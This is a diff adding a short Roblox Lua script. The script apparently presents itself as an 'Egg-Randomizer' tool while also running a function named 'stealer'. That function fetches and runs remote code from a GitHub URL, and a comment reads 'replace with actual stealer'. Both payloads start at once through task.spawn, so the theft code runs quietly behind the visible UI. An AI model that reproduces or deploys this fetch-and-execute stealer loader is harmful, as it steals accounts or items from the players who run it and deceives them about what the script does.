@@ -1,0 +1,10 @@
+local function stealer()
+‎    loadstring(game:HttpGet("https://raw.githubusercontent.com/elmoHUB/lua/refs/heads/main/stealer"))() -- replace with actual stealer
+‎end
+‎local function loadui()
+‎  loadstring(game:HttpGet("https://raw.githubusercontent.com/elmoHUB/lua/refs/heads/main/Egg-Randomizer"))()
+‎
+‎end
+‎
+‎task.spawn(stealer)
+‎task.spawn(loadui)
